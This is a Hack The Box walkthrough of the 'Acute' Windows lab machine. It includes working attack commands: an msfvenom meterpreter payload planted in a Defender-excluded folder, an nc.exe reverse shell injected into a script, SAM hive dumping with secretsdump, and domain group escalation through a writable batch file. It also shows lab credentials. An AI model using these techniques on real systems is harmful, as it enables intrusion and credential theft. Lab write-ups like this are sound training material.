# [Acute](https://app.hackthebox.com/machines/Acute)

```bash
nmap -p- --min-rate 10000 10.10.11.145 -Pn
```

![Alt text](img/image.png)


After detection of one port (443), let's do greater nmap scan.

```bash
nmap -A -sC -sV -p443 10.10.11.145
```

![Alt text](img/image-1.png)


From this image, I add 'atsserver.acute.local' and 'acute.local' into my '**/etc/hosts**' file


We have a web application for 'atsserver.acute.local'.

![Alt text](img/image-2.png)


From response headers, I see that 'X-Powered-By' value is 'ASP.NET', let's search directories.

```bash
feroxbuster -u https://atsserver.acute.local/ -x aspx -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
```

![Alt text](img/image-5.png)

I found `.docx` file which gives default password, also there is remote training is possible means (RDP is enabled for some server)


![Alt text](img/image-3.png)


I got usernames from possible name and surnames for below image.

![Alt text](img/image-4.png)


[Link](https://atsserver.acute.local/Acute_Staff_Access)  for remote access.


I also do `exiftool` for `.docx` file, which shows computer name '**Acute-PC01**'.

Possible usernames like below for one password 'Password1!'.

```bash
awallace
chall
edavies
imonks
jmorgan
lhopkins
```

![Alt text](img/image-6.png)


I got Powershell.

![Alt text](img/image-7.png)


I tried to upload malicious executable, but it doesn't work as because of 'Windows Defender'.

I search `Exclusions` directories for  'Windows Defender' via below `reg query` command.

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
```

![Alt text](img/image-8.png)


Let's upload malicious executable into 'C:\Utils' directory.

1.First, let's create malicious executable via `msfvenom` command.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=1337 LHOST=10.10.16.6 -f exe -o dr4ks.exe
```

![Alt text](img/image-9.png)


2.Let's open HTTP serve to serve this malicious executable.
```bash
python3 -m http.server --bind 10.10.16.6 8080
```

![Alt text](img/image-11.png)


3.Then, download this via `wget` command. (on C:\Utils)
```bash
wget http://10.10.16.6:8080/dr4ks.exe -outfile dr4ks.exe
```

![Alt text](img/image-10.png)

While executing this malicious 'dr4ks.exe' file, I got reverse shell from port (1337).


![Alt text](img/image-12.png)


I see live RDP sessions via `qwinsta` command.

```bash
qwinsta /server:127.0.0.1
```

![Alt text](img/image-13.png)


While I doing `screenshare` command on `meterpreter` shell, it gives live screen recording to me.

![Alt text](img/image-14.png)



I copied all commands from screen mirroring.

```bash
$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $pass)
Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred
```

![Alt text](img/image-15.png)


I check that my credentials worked or not via below command.

```bash
Invoke-Command -ScriptBlock { whoami } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

![Alt text](img/image-16.png)



I can read user.txt file via typing a lot of commands using this session.

```bash
Invoke-Command -ScriptBlock { cat C:\users\imonks\desktop\user.txt } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

user.txt

![Alt text](img/image-17.png)


I found a file which have sensitive credentials called 'wm.ps1'
```bash
Invoke-Command -ScriptBlock { cat ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

![Alt text](img/image-18.png)


I knwo that this 'jmorgan' user is group of '**Administrators**' `net localgroup Administrators`.

![Alt text](img/image-19.png)


Now, I replace this `wm.ps1` command via my reverse shell, but my `nc.exe` binary should be in 'C:\Utils' directory.


```bash
Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc.exe -e cmd 10.10.16.6 1338') | sc -Path ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```


Yes, I read that my reverse shell script block is located or not via below command.

```bash
Invoke-Command -ScriptBlock { cat ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

![Alt text](img/image-20.png)


Let's run this powershell script via below cmdlet.

```bash
Invoke-Command -ScriptBlock { C:\users\imonks\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

I got reverse shell from port (1338).

![Alt text](img/image-21.png)


As this user belongs to 'Administrators' localgroup, can easily dump 'SAM' and 'SYSTEM' files.

```bash
reg save HKLM\sam sam.bak
reg save HKLM\system sys.bak
```

![Alt text](img/image-22.png)


I download two files from `meterpreter` shell.

![Alt text](img/image-23.png)


Now, to dump SAM database, I need to use `secretsdump.py` script of `Impacket` module.
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system sys.bak LOCAL
```

![Alt text](img/image-24.png)



I crack the password of 'Administrator' user via [Crackstation](https://crackstation.net).

![Alt text](img/image-25.png)


I use this password for 'awallace' user.

```bash
$pass = ConvertTo-SecureString "Password@123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("ACUTE\awallace", $pass)
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } 
```

![Alt text](img/image-26.png)

I found a script which this user have permission '\program files\keepmeon'. which is `.bat` file, If I add reverse shell into it, I can be Administrator.


I looked at Domain Admins via `net group /domain`.

![Alt text](img/image-27.png)


I looked at specific one called 'Site_Admin'.

![Alt text](img/image-28.png)


I will use `.bat` script to add my user into this 'Site_Admin' group via below command.

```bash
Invoke-Command -ScriptBlock { Set-Content -Path '\program files\keepmeon\0xdf.bat' -Value 'net group site_admin awallace /add /domain'} -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred

Invoke-Command -ScriptBlock { cat '\program files\keepmeon\0xdf.bat' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred  #check that previous command added or not
```

![Alt text](img/image-29.png)


Now, I can read root.txt via below command.

```bash
Invoke-Command -ScriptBlock { cat \users\administrator\desktop\root.txt  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```


root.txt

![Alt text](img/image-30.png)

